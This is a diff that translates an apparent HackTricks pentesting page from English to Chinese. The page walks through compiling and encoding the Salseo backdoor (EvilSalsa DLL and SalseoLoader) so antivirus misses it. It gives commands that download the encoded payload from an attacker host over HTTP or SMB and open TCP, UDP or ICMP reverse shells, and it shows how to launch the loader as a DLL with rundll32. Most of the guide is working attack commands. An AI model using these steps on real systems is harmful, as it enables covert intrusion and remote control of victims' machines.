@@ -2,159 +2,142 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Compiling the binaries
+## 编译二进制文件
 
-Download the source code from the github and compile **EvilSalsa** and **SalseoLoader**. You will need **Visual Studio** installed to compile the code.
+从github下载源代码并编译**EvilSalsa**和**SalseoLoader**。您需要安装**Visual Studio**来编译代码。
 
-Compile those projects for the architecture of the windows box where your are going to use them(If the Windows supports x64 compile them for that architectures).
+为您将要使用的Windows机器的架构编译这些项目（如果Windows支持x64，则为该架构编译）。
 
-You can **select the architecture** inside Visual Studio in the **left "Build" Tab** in **"Platform Target".**
+您可以在Visual Studio的**左侧“Build”选项卡**中的**“Platform Target”**选择架构。
 
-(\*\*If you can't find this options press in **"Project Tab"** and then in **"\<Project Name> Properties"**)
+(\*\*如果找不到此选项，请按**“Project Tab”**，然后在**“\<Project Name> Properties”**中)
 
 ![](<../images/image (132).png>)
 
-Then, build both projects (Build -> Build Solution) (Inside the logs will appear the path of the executable):
+然后，构建这两个项目（Build -> Build Solution）（在日志中将出现可执行文件的路径）：
 
 ![](<../images/image (1) (2) (1) (1) (1).png>)
 
-## Prepare the Backdoor
+## 准备后门
 
-First of all, you will need to encode the **EvilSalsa.dll.** To do so, you can use the python script **encrypterassembly.py** or you can compile the project **EncrypterAssembly**:
+首先，您需要对**EvilSalsa.dll**进行编码。为此，您可以使用python脚本**encrypterassembly.py**，或者您可以编译项目**EncrypterAssembly**：
 
 ### **Python**
-
 ```
 python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
 python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
 ```
-
 ### Windows
-
 ```
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
 ```
+好的，现在你拥有执行所有 Salseo 操作所需的一切：**编码的 EvilDalsa.dll** 和 **SalseoLoader 的二进制文件**。
 
-Ok, now you have everything you need to execute all the Salseo thing: the **encoded EvilDalsa.dll** and the **binary of SalseoLoader.**
+**将 SalseoLoader.exe 二进制文件上传到机器上。它们不应该被任何 AV 检测到...**
 
-**Upload the SalseoLoader.exe binary to the machine. They shouldn't be detected by any AV...**
+## **执行后门**
 
-## **Execute the backdoor**
+### **获取 TCP 反向 shell（通过 HTTP 下载编码的 dll）**
 
-### **Getting a TCP reverse shell (downloading encoded dll through HTTP)**
-
-Remember to start a nc as the reverse shell listener and a HTTP server to serve the encoded evilsalsa.
-
+记得启动一个 nc 作为反向 shell 监听器，并启动一个 HTTP 服务器来提供编码的 evilsalsa。
 ```
 SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
 ```
+### **获取UDP反向Shell（通过SMB下载编码的dll）**
 
-### **Getting a UDP reverse shell (downloading encoded dll through SMB)**
-
-Remember to start a nc as the reverse shell listener, and a SMB server to serve the encoded evilsalsa (impacket-smbserver).
-
+记得启动nc作为反向Shell监听器，并启动SMB服务器以提供编码的evilsalsa（impacket-smbserver）。
 ```
 SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
 ```
+### **获取 ICMP 反向 shell（受害者内部已编码的 dll）**
 
-### **Getting a ICMP reverse shell (encoded dll already inside the victim)**
+**这次你需要一个特殊的工具在客户端接收反向 shell。下载：** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
 
-**This time you need a special tool in the client to receive the reverse shell. Download:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
-
-#### **Disable ICMP Replies:**
-
+#### **禁用 ICMP 回复：**
 ```
 sysctl -w net.ipv4.icmp_echo_ignore_all=1
 
 #You finish, you can enable it again running:
 sysctl -w net.ipv4.icmp_echo_ignore_all=0
 ```
-
-#### Execute the client:
-
+#### 执行客户端：
 ```
 python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
 ```
-
-#### Inside the victim, lets execute the salseo thing:
-
+#### 在受害者内部，让我们执行salseo操作：
 ```
 SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 ```
+## 编译 SalseoLoader 为导出主函数的 DLL
 
-## Compiling SalseoLoader as DLL exporting main function
+使用 Visual Studio 打开 SalseoLoader 项目。
 
-Open the SalseoLoader project using Visual Studio.
-
-### Add before the main function: \[DllExport]
+### 在主函数之前添加: \[DllExport]
 
 ![](<../images/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-### Install DllExport for this project
+### 为此项目安装 DllExport
 
-#### **Tools** --> **NuGet Package Manager** --> **Manage NuGet Packages for Solution...**
+#### **工具** --> **NuGet 包管理器** --> **管理解决方案的 NuGet 包...**
 
 ![](<../images/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-#### **Search for DllExport package (using Browse tab), and press Install (and accept the popup)**
+#### **搜索 DllExport 包（使用浏览选项卡），然后按安装（并接受弹出窗口）**
 
 ![](<../images/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-In your project folder have appeared the files: **DllExport.bat** and **DllExport_Configure.bat**
+在你的项目文件夹中出现了文件: **DllExport.bat** 和 **DllExport_Configure.bat**
 
-### **U**ninstall DllExport
+### **卸载** DllExport
 
-Press **Uninstall** (yeah, its weird but trust me, it is necessary)
+按 **卸载**（是的，这很奇怪，但相信我，这是必要的）
 
 ![](<../images/image (5) (1) (1) (2) (1).png>)
 
-### **Exit Visual Studio and execute DllExport_configure**
+### **退出 Visual Studio 并执行 DllExport_configure**
 
-Just **exit** Visual Studio
+只需 **退出** Visual Studio
 
-Then, go to your **SalseoLoader folder** and **execute DllExport_Configure.bat**
+然后，转到你的 **SalseoLoader 文件夹** 并 **执行 DllExport_Configure.bat**
 
-Select **x64** (if you are going to use it inside a x64 box, that was my case), select **System.Runtime.InteropServices** (inside **Namespace for DllExport**) and press **Apply**
+选择 **x64**（如果你打算在 x64 盒子中使用它，那是我的情况），选择 **System.Runtime.InteropServices**（在 **DllExport 的命名空间中**）并按 **应用**
 
 ![](<../images/image (7) (1) (1) (1) (1).png>)
 
-### **Open the project again with visual Studio**
+### **再次使用 Visual Studio 打开项目**
 
-**\[DllExport]** should not be longer marked as error
+**\[DllExport]** 不应再标记为错误
 
 ![](<../images/image (8) (1).png>)
 
-### Build the solution
+### 构建解决方案
 
-Select **Output Type = Class Library** (Project --> SalseoLoader Properties --> Application --> Output type = Class Library)
+选择 **输出类型 = 类库**（项目 --> SalseoLoader 属性 --> 应用程序 --> 输出类型 = 类库）
 
 ![](<../images/image (10) (1).png>)
 
-Select **x64** **platform** (Project --> SalseoLoader Properties --> Build --> Platform target = x64)
+选择 **x64** **平台**（项目 --> SalseoLoader 属性 --> 构建 --> 平台目标 = x64）
 
 ![](<../images/image (9) (1) (1).png>)
 
-To **build** the solution: Build --> Build Solution (Inside the Output console the path of the new DLL will appear)
+要 **构建** 解决方案: 构建 --> 构建解决方案（在输出控制台中将出现新 DLL 的路径）
 
-### Test the generated Dll
+### 测试生成的 Dll
 
-Copy and paste the Dll where you want to test it.
+将 Dll 复制并粘贴到你想测试的位置。
 
-Execute:
-
+执行:
 ```
 rundll32.exe SalseoLoader.dll,main
 ```
+如果没有错误出现，您可能有一个功能正常的 DLL！！
 
-If no error appears, probably you have a functional DLL!!
+## 使用 DLL 获取 shell
 
-## Get a shell using the DLL
-
-Don't forget to use a **HTTP** **server** and set a **nc** **listener**
+不要忘记使用 **HTTP** **服务器** 并设置 **nc** **监听器**
 
 ### Powershell
-
 ```
 $env:pass="password"
 $env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
@@ -163,9 +146,7 @@ $env:lport="1337"
 $env:shell="reversetcp"
 rundll32.exe SalseoLoader.dll,main
 ```
-
 ### CMD
-
 ```
 set pass=password
 set payload=http://10.2.0.5/evilsalsax64.dll.txt
@@ -174,5 +155,4 @@ set lport=1337
 set shell=reversetcp
 rundll32.exe SalseoLoader.dll,main
 ```
-
 {{#include ../banners/hacktricks-training.md}}
